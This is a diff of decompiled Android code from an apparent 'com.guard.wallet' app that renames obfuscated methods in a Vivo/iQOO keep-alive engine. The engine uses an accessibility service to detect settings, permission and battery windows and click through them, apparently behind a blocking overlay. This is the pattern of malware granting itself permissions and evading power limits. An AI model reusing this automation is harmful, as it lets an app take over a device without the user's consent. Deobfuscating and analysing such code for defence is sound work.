@@ -51,7 +51,7 @@ public final class VivoEngine extends KeepAliveEngine {
     public final AtomicBoolean A;
 
     public VivoEngine() {
-        super(u0(), "com.android.settings");
+        super(buildAllListenWindows(), "com.android.settings");
         this.A = new AtomicBoolean(false);
         try {
             super.p.schedule(new com.guard.wallet.delegate.task.VivoDelegateTask(this, 0), 120L, TimeUnit.SECONDS);
@@ -62,7 +62,7 @@ public final class VivoEngine extends KeepAliveEngine {
 
     // ======= Static CombineFilter builders =======
 
-    public static CombineFilter b0() {
+    public static CombineFilter buildAllowButtonFilter() {
         CombineFilter f = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(f,
                 FilterHelper.initFilter(f, "className", "android.widget.Button"), "text");
@@ -71,7 +71,7 @@ public final class VivoEngine extends KeepAliveEngine {
         return f;
     }
 
-    public static CombineFilter C0() {
+    public static CombineFilter buildAllOptRelativeLayoutFilter() {
         CombineFilter f = new CombineFilter();
         f.getStringConditions().add(FilterHelper.initFilter(f, "className", "android.widget.RelativeLayout"));
         StringCondition sc = new StringCondition();
@@ -81,7 +81,7 @@ public final class VivoEngine extends KeepAliveEngine {
         return f;
     }
 
-    public static CombineFilter D0() {
+    public static CombineFilter buildAllPermissionTextFilter() {
         CombineFilter f = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(f,
                 FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
@@ -90,7 +90,7 @@ public final class VivoEngine extends KeepAliveEngine {
         return f;
     }
 
-    public static CombineFilter E0() {
+    public static CombineFilter buildBackgroundPowerManagerFilter() {
         CombineFilter f = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(f,
                 FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
@@ -99,7 +99,7 @@ public final class VivoEngine extends KeepAliveEngine {
         return f;
     }
 
-    public static CombineFilter H0() {
+    public static CombineFilter buildAppPermissionTextFilter() {
         CombineFilter f = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(f,
                 FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
@@ -108,7 +108,7 @@ public final class VivoEngine extends KeepAliveEngine {
         return f;
     }
 
-    public static CombineFilter i0() {
+    public static CombineFilter buildAutoStartTextFilter() {
         CombineFilter f = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(f,
                 FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
@@ -117,7 +117,7 @@ public final class VivoEngine extends KeepAliveEngine {
         return f;
     }
 
-    public static CombineFilter w0() {
+    public static CombineFilter buildPopupInBackgroundFilter() {
         CombineFilter f = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(f,
                 FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
@@ -128,27 +128,27 @@ public final class VivoEngine extends KeepAliveEngine {
 
     // ======= Static ListenWindow builders =======
 
-    public static ListenWindow B0() {
+    public static ListenWindow buildPermissionAlertDialogWindow() {
         ListenWindow lw = new ListenWindow("com.vivo.permissionmanager", "android.app.AlertDialog");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    public static ListenWindow F0() {
+    public static ListenWindow buildVivoExcessivePowerDescWindow() {
         ListenWindow lw = new ListenWindow("com.vivo.abe",
                 "com.vivo.applicationbehaviorengine.ui.ExcessivePowerDescriptionActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    public static ListenWindow G0() {
+    public static ListenWindow buildVivoExcessivePowerManagerWindow() {
         ListenWindow lw = new ListenWindow("com.vivo.abe",
                 "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    public static ListenWindow c0(String appName) {
+    public static ListenWindow buildVivoSubSettingsWindow(String appName) {
         ListenWindow lw = new ListenWindow("com.android.settings", "com.vivo.settings.VivoSubSettings");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         lw.setMatchs(new LinkedList<>());
@@ -156,7 +156,7 @@ public final class VivoEngine extends KeepAliveEngine {
         return lw;
     }
 
-    public static ListenWindow d0(String appName) {
+    public static ListenWindow buildInstalledAppDetailWindow(String appName) {
         ListenWindow lw = new ListenWindow("com.android.settings",
                 "com.vivo.settings.applications.InstalledAppDetailsTop");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
@@ -165,7 +165,7 @@ public final class VivoEngine extends KeepAliveEngine {
         return lw;
     }
 
-    public static ListenWindow e0(String appName) {
+    public static ListenWindow buildGenericMatchWindow(String appName) {
         ListenWindow lw = new ListenWindow(null, null);
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         lw.setMatchs(new LinkedList<>());
@@ -173,79 +173,79 @@ public final class VivoEngine extends KeepAliveEngine {
         return lw;
     }
 
-    public static ListenWindow f0() {
+    public static ListenWindow buildSoftPermissionDetailWindow() {
         ListenWindow lw = new ListenWindow("com.vivo.permissionmanager",
                 "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    public static ListenWindow g0() {
+    public static ListenWindow buildFrameLayoutWindow() {
         ListenWindow lw = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    public static ListenWindow h0() {
+    public static ListenWindow buildManagePermissionsWindow() {
         ListenWindow lw = new ListenWindow("com.android.permissioncontroller",
                 "com.android.permissioncontroller.permission.ui.ManagePermissionsActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    public static ListenWindow r0() {
+    public static ListenWindow buildIqooExcessivePowerDescWindow() {
         ListenWindow lw = new ListenWindow("com.iqoo.powersaving",
                 "com.iqoo.powersaving.activity.ExcessivePowerDescriptionActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    public static ListenWindow s0() {
+    public static ListenWindow buildIqooExcessivePowerManagerWindow() {
         ListenWindow lw = new ListenWindow("com.iqoo.powersaving",
                 "com.iqoo.powersaving.activity.ExcessivePowerManagerActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    public static ListenWindow v0() {
+    public static ListenWindow buildOriginUiDialogWindow() {
         ListenWindow lw = new ListenWindow("com.vivo.permissionmanager",
                 "com.originui.widget.dialog.h");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    public static ListenWindow x0() {
+    public static ListenWindow buildPowerRankWindow() {
         ListenWindow lw = new ListenWindow("com.iqoo.powersaving",
                 "com.iqoo.powersaving.fuelgauge.PowerRankActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    public static LinkedList u0() {
+    public static LinkedList buildAllListenWindows() {
         LinkedList list = new LinkedList();
         list.add(buildBatteryDialogListenWindow());
-        list.add(d0(com.guard.wallet.utils.SystemHelper.x0()));
-        list.add(c0(com.guard.wallet.utils.SystemHelper.x0()));
-        list.add(d0(com.guard.wallet.utils.SystemHelper.e()));
-        list.add(c0(com.guard.wallet.utils.SystemHelper.e()));
-        list.add(h0());
-        list.add(g0());
-        list.add(f0());
-        list.add(e0(com.guard.wallet.utils.SystemHelper.x0()));
-        list.add(e0(com.guard.wallet.utils.SystemHelper.e()));
-        list.add(v0());
-        list.add(B0());
-        list.add(x0());
-        list.add(G0());
-        list.add(s0());
-        list.add(F0());
-        list.add(r0());
+        list.add(buildInstalledAppDetailWindow(com.guard.wallet.utils.SystemHelper.x0()));
+        list.add(buildVivoSubSettingsWindow(com.guard.wallet.utils.SystemHelper.x0()));
+        list.add(buildInstalledAppDetailWindow(com.guard.wallet.utils.SystemHelper.e()));
+        list.add(buildVivoSubSettingsWindow(com.guard.wallet.utils.SystemHelper.e()));
+        list.add(buildManagePermissionsWindow());
+        list.add(buildFrameLayoutWindow());
+        list.add(buildSoftPermissionDetailWindow());
+        list.add(buildGenericMatchWindow(com.guard.wallet.utils.SystemHelper.x0()));
+        list.add(buildGenericMatchWindow(com.guard.wallet.utils.SystemHelper.e()));
+        list.add(buildOriginUiDialogWindow());
+        list.add(buildPermissionAlertDialogWindow());
+        list.add(buildPowerRankWindow());
+        list.add(buildVivoExcessivePowerManagerWindow());
+        list.add(buildIqooExcessivePowerManagerWindow());
+        list.add(buildVivoExcessivePowerDescWindow());
+        list.add(buildIqooExcessivePowerDescWindow());
         return list;
     }
 
     // ======= Instance methods =======
 
-    public final boolean A0() {
+    public final boolean launchPowerRankActivity() {
         try {
             if (com.guard.wallet.utils.SystemHelper.Z() != null) {
                 ComponentName cn = new ComponentName("com.iqoo.powersaving",
@@ -281,7 +281,7 @@ public final class VivoEngine extends KeepAliveEngine {
                     if (MyAccessibilityService.P() != null) {
                         MyAccessibilityService.P().x();
                     }
-                    this.y0();
+                    this.savePowerControlState();
                     super.p.shutdownNow();
                     com.guard.wallet.thread.DelegateTaskLauncher.a(super.c);
                     super.n.clear();
@@ -316,13 +316,13 @@ public final class VivoEngine extends KeepAliveEngine {
         return Objects.hash(VivoEngine.class.getName());
     }
 
-    public final boolean j0() {
+    public final boolean isInAppDetailWindow() {
         try {
             LinkedList list = new LinkedList();
-            list.add(d0(com.guard.wallet.utils.SystemHelper.x0()));
-            list.add(c0(com.guard.wallet.utils.SystemHelper.x0()));
-            list.add(d0(com.guard.wallet.utils.SystemHelper.e()));
-            list.add(c0(com.guard.wallet.utils.SystemHelper.e()));
+            list.add(buildInstalledAppDetailWindow(com.guard.wallet.utils.SystemHelper.x0()));
+            list.add(buildVivoSubSettingsWindow(com.guard.wallet.utils.SystemHelper.x0()));
+            list.add(buildInstalledAppDetailWindow(com.guard.wallet.utils.SystemHelper.e()));
+            list.add(buildVivoSubSettingsWindow(com.guard.wallet.utils.SystemHelper.e()));
             if (this.q(list)) {
                 Log.d("o.i0", "已进入App详情窗口");
                 return true;
@@ -333,12 +333,12 @@ public final class VivoEngine extends KeepAliveEngine {
         return false;
     }
 
-    public final boolean k0() {
+    public final boolean isInPermissionDetailWindow() {
         try {
             LinkedList list = new LinkedList();
-            list.add(f0());
-            list.add(e0(com.guard.wallet.utils.SystemHelper.x0()));
-            list.add(e0(com.guard.wallet.utils.SystemHelper.e()));
+            list.add(buildSoftPermissionDetailWindow());
+            list.add(buildGenericMatchWindow(com.guard.wallet.utils.SystemHelper.x0()));
+            list.add(buildGenericMatchWindow(com.guard.wallet.utils.SystemHelper.e()));
             if (this.q(list)) {
                 Log.d("o.i0", "已进入App权限详情窗口");
                 return true;
@@ -349,13 +349,13 @@ public final class VivoEngine extends KeepAliveEngine {
         return false;
     }
 
-    public final boolean l0() {
+    public final boolean isInPermissionManageWindow() {
         try {
             LinkedList list = new LinkedList();
-            list.add(h0());
-            list.add(g0());
-            list.add(e0(com.guard.wallet.utils.SystemHelper.x0()));
-            list.add(e0(com.guard.wallet.utils.SystemHelper.e()));
+            list.add(buildManagePermissionsWindow());
+            list.add(buildFrameLayoutWindow());
+            list.add(buildGenericMatchWindow(com.guard.wallet.utils.SystemHelper.x0()));
+            list.add(buildGenericMatchWindow(com.guard.wallet.utils.SystemHelper.e()));
             if (this.q(list)) {
                 Log.d("o.i0", "已进入App权限管理窗口");
                 return true;
@@ -366,11 +366,11 @@ public final class VivoEngine extends KeepAliveEngine {
         return false;
     }
 
-    public final boolean m0() {
+    public final boolean isInExcessivePowerDescWindow() {
         try {
             LinkedList list = new LinkedList();
-            list.add(F0());
-            list.add(r0());
+            list.add(buildVivoExcessivePowerDescWindow());
+            list.add(buildIqooExcessivePowerDescWindow());
             if (this.q(list)) {
                 Log.d("o.i0", "已进入App后台耗电详情窗口");
                 return true;
@@ -381,11 +381,11 @@ public final class VivoEngine extends KeepAliveEngine {
         return false;
     }
 
-    public final boolean n0() {
+    public final boolean isInExcessivePowerManagerWindow() {
         try {
             LinkedList list = new LinkedList();
-            list.add(G0());
-            list.add(s0());
+            list.add(buildVivoExcessivePowerManagerWindow());
+            list.add(buildIqooExcessivePowerManagerWindow());
             if (this.q(list)) {
                 Log.d("o.i0", "已进入后台耗电管理窗口");
                 return true;
@@ -396,11 +396,11 @@ public final class VivoEngine extends KeepAliveEngine {
         return false;
     }
 
-    public final boolean o0() {
+    public final boolean isInPermissionAllowDialogWindow() {
         try {
             LinkedList list = new LinkedList();
-            list.add(v0());
-            list.add(B0());
+            list.add(buildOriginUiDialogWindow());
+            list.add(buildPermissionAlertDialogWindow());
             if (this.q(list)) {
                 Log.d("o.i0", "已进入是否允许权限对话框");
                 return true;
@@ -411,9 +411,9 @@ public final class VivoEngine extends KeepAliveEngine {
         return false;
     }
 
-    public final boolean p0() {
+    public final boolean isInPowerRankWindow() {
         try {
-            if (this.q(Collections.singletonList(x0()))) {
+            if (this.q(Collections.singletonList(buildPowerRankWindow()))) {
                 Log.d("o.i0", "已进入电池管理窗口");
                 return true;
             }
@@ -423,7 +423,7 @@ public final class VivoEngine extends KeepAliveEngine {
         return false;
     }
 
-    public final void q0() {
+    public final void scrollAndClickPermissionDetail() {
         try {
             ScreenMetricsVO metrics = com.guard.wallet.utils.DeviceUtils.buildScreenMetrics();
             Log.d("o.i0", String.valueOf(metrics.getNavigationBarHeight()));
@@ -446,9 +446,9 @@ public final class VivoEngine extends KeepAliveEngine {
         }
     }
 
-    public final void t0() {
+    public final void navigateToAllPermissions() {
         try {
-            boolean inPermManage = this.l0();
+            boolean inPermManage = this.isInPermissionManageWindow();
             AtomicReference stateRef = this.s;
             if (inPermManage) {
                 com.guard.wallet.helper.BlockViewManager.h(80);
@@ -463,15 +463,15 @@ public final class VivoEngine extends KeepAliveEngine {
                 UiObject found;
                 if (scrollView != null) {
                     Log.d("o.i0", "权限窗口滚动视图查找完成");
-                    found = FilterHelper.scrollForwardUtil(scrollView, D0(), 0, 0);
+                    found = FilterHelper.scrollForwardUtil(scrollView, buildAllPermissionTextFilter(), 0, 0);
                     if (found == null) {
-                        found = FilterHelper.scrollBackwardUtilFilter(scrollView, D0());
+                        found = FilterHelper.scrollBackwardUtilFilter(scrollView, buildAllPermissionTextFilter());
                     }
                 } else {
                     found = null;
                 }
                 if (found == null) {
-                    found = this.k().findOneByCombine(D0());
+                    found = this.k().findOneByCombine(buildAllPermissionTextFilter());
                 }
                 if (found != null) {
                     Log.d("o.i0", "所有权限栏目查找成功");
@@ -486,7 +486,7 @@ public final class VivoEngine extends KeepAliveEngine {
                 }
             }
             if (Objects.equals(stateRef.get(), "prepareInAppPermissionManage")) {
-                this.q0();
+                this.scrollAndClickPermissionDetail();
                 com.guard.wallet.helper.BlockViewManager.h(85);
             }
         } catch (Exception ex) {
@@ -494,7 +494,7 @@ public final class VivoEngine extends KeepAliveEngine {
         }
     }
 
-    public final void y0() {
+    public final void savePowerControlState() {
         try {
             PowerControlStateVO vo = com.guard.wallet.utils.SharedPrefsManager.k(
                     MainApplication.getAppContext().getPackageName());
@@ -537,9 +537,9 @@ public final class VivoEngine extends KeepAliveEngine {
         }
     }
 
-    public final void z0() {
+    public final void advanceStateMachine() {
         try {
-            this.y0();
+            this.savePowerControlState();
             AtomicReference keepAliveRef = this.r;
             boolean isUnknown = Objects.equals(keepAliveRef.get(), KEEP_ALIVE_UNKNOWN);
             AtomicReference stateRef = this.s;
@@ -575,7 +575,7 @@ public final class VivoEngine extends KeepAliveEngine {
                 return;
             }
 
-            this.y0();
+            this.savePowerControlState();
             this.Z();
         } catch (Exception ex) {
             AppUtils.s("o.i0", ex);
@@ -595,7 +595,7 @@ public final class VivoEngine extends KeepAliveEngine {
             String threadId = super.c;
             ConcurrentLinkedQueue taskQueue = super.n;
 
-            if (Objects.equals(stateRef.get(), "prepareInAppPowerRank") && this.p0()) {
+            if (Objects.equals(stateRef.get(), "prepareInAppPowerRank") && this.isInPowerRankWindow()) {
                 com.guard.wallet.utils.SystemHelper.T0(5);
                 taskQueue.remove("keepAliveInExcessivePowerManager");
                 taskQueue.remove("keepAliveInExcessivePowerDescription");
@@ -609,7 +609,7 @@ public final class VivoEngine extends KeepAliveEngine {
                 }
             }
 
-            if (Objects.equals(stateRef.get(), "prepareInExcessivePowerManager") && this.n0()) {
+            if (Objects.equals(stateRef.get(), "prepareInExcessivePowerManager") && this.isInExcessivePowerManagerWindow()) {
                 com.guard.wallet.utils.SystemHelper.T0(5);
                 taskQueue.remove("keepAliveInPowerRank");
                 taskQueue.remove("keepAliveInExcessivePowerDescription");
@@ -623,7 +623,7 @@ public final class VivoEngine extends KeepAliveEngine {
                 }
             }
 
-            if (Objects.equals(stateRef.get(), "prepareInExcessivePowerDescription") && this.m0()) {
+            if (Objects.equals(stateRef.get(), "prepareInExcessivePowerDescription") && this.isInExcessivePowerDescWindow()) {
                 com.guard.wallet.utils.SystemHelper.T0(5);
                 taskQueue.remove("keepAliveInPowerRank");
                 taskQueue.remove("keepAliveInExcessivePowerManager");
@@ -637,7 +637,7 @@ public final class VivoEngine extends KeepAliveEngine {
                 }
             }
 
-            if (Objects.equals(stateRef.get(), "prepareInAppDetailSetting") && this.j0()) {
+            if (Objects.equals(stateRef.get(), "prepareInAppDetailSetting") && this.isInAppDetailWindow()) {
                 com.guard.wallet.utils.SystemHelper.T0(5);
                 taskQueue.remove("keepAliveInPowerRank");
                 taskQueue.remove("keepAliveInExcessivePowerManager");
@@ -651,7 +651,7 @@ public final class VivoEngine extends KeepAliveEngine {
                 }
             }
 
-            if (Objects.equals(stateRef.get(), "prepareInAppPermissionManage") && this.l0()) {
+            if (Objects.equals(stateRef.get(), "prepareInAppPermissionManage") && this.isInPermissionManageWindow()) {
                 com.guard.wallet.utils.SystemHelper.T0(5);
                 taskQueue.remove("keepAliveInPowerRank");
                 taskQueue.remove("keepAliveInExcessivePowerManager");
@@ -665,7 +665,7 @@ public final class VivoEngine extends KeepAliveEngine {
                 }
             }
 
-            if (Objects.equals(stateRef.get(), "prepareInAppPermissionDetail") && this.k0()) {
+            if (Objects.equals(stateRef.get(), "prepareInAppPermissionDetail") && this.isInPermissionDetailWindow()) {
                 com.guard.wallet.utils.SystemHelper.T0(5);
                 taskQueue.remove("keepAliveInPowerRank");
                 taskQueue.remove("keepAliveInExcessivePowerManager");
@@ -679,7 +679,7 @@ public final class VivoEngine extends KeepAliveEngine {
                 }
             }
 
-            if (Objects.equals(stateRef.get(), "prepareInPermissionAllowDialog") && this.o0()) {
+            if (Objects.equals(stateRef.get(), "prepareInPermissionAllowDialog") && this.isInPermissionAllowDialogWindow()) {
                 com.guard.wallet.utils.SystemHelper.T0(5);
                 taskQueue.remove("keepAliveInPowerRank");
                 taskQueue.remove("keepAliveInExcessivePowerManager");
